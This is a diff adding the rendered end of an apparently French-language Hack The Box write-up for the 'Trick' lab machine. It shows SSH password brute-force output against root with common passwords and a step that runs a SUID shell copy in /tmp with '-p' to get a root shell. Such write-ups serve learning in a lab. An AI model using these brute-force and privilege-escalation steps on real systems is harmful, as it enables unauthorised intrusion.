+</span></span><span class="line"><span class="cl">SSH         10.129.104.218  <span class="m">22</span>     trick.htb        <span class="o">[</span>-<span class="o">]</span> root:123456
+</span></span><span class="line"><span class="cl">SSH         10.129.104.218  <span class="m">22</span>     trick.htb        <span class="o">[</span>-<span class="o">]</span> root:password
+</span></span><span class="line"><span class="cl">SSH         10.129.104.218  <span class="m">22</span>     trick.htb        <span class="o">[</span>-<span class="o">]</span> root:12345678
+</span></span><span class="line"><span class="cl">SSH         10.129.104.218  <span class="m">22</span>     trick.htb        <span class="o">[</span>-<span class="o">]</span> root:qwerty
+</span></span><span class="line"><span class="cl">SSH         10.129.104.218  <span class="m">22</span>     trick.htb        <span class="o">[</span>-<span class="o">]</span> root:123456789
+</span></span><span class="line"><span class="cl">SSH         10.129.104.218  <span class="m">22</span>     trick.htb        <span class="o">[</span>-<span class="o">]</span> root:12345
+</span></span><span class="line"><span class="cl">SSH         10.129.104.218  <span class="m">22</span>     trick.htb        <span class="o">[</span>-<span class="o">]</span> root:1234
+</span></span><span class="line"><span class="cl">SSH         10.129.104.218  <span class="m">22</span>     trick.htb        <span class="o">[</span>-<span class="o">]</span> root:111111
+</span></span><span class="line"><span class="cl">SSH         10.129.104.218  <span class="m">22</span>     trick.htb        <span class="o">[</span>-<span class="o">]</span> root:1234567
+</span></span><span class="line"><span class="cl">SSH         10.129.104.218  <span class="m">22</span>     trick.htb        <span class="o">[</span>-<span class="o">]</span> root:dragon</span></span></code></pre></div></div>
+<p>Mais dans le répertoire <code>/tmp</code>, le fichier <code>z3rodol</code> est bien créé. Il ne me reste plus qu&rsquo;a l’exécuter avec l&rsquo;option <code>-p</code> pour obtenir un shell en tant que root.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Trick/Trick-22.png"
+        data-srcset="/images/Trick/Trick-22.png, /images/Trick/Trick-22.png 1.5x, /images/Trick/Trick-22.png 2x"
+        data-sizes="auto"
+        alt="/images/Trick/Trick-22.png"
+        title="/images/Trick/Trick-22.png" width="1799" height="836" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-12-11</span>
+            </div><div id="page-views" class="post-info-mod">
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/trick/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/trick/" data-title="Trick" data-via="z3rodol" data-hashtags="Easy,Linux,LFI,SQL Injection,Fail2ban"><i class="fab fa-x-twitter" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/easy/">Easy</a>,&nbsp;<a href="/tags/linux/">Linux</a>,&nbsp;<a href="/tags/lfi/">LFI</a>,&nbsp;<a href="/tags/sql-injection/">SQL Injection</a>,&nbsp;<a href="/tags/fail2ban/">Fail2ban</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/unholyunion/" class="prev" rel="prev" title="Unholy Union"><i class="fas fa-angle-left" aria-hidden="true"></i>Unholy Union</a>
+            <a href="/tombwatcher/" class="next" rel="next" title="TombWatcher">TombWatcher<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.158.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2025 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://z3rodol.github.io" target="_blank">z3rodol</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/contrib/auto-render.min.js"></script><script src="/lib/katex/contrib/copy-tex.min.js"></script><script src="/lib/katex/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":15,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
+</html>
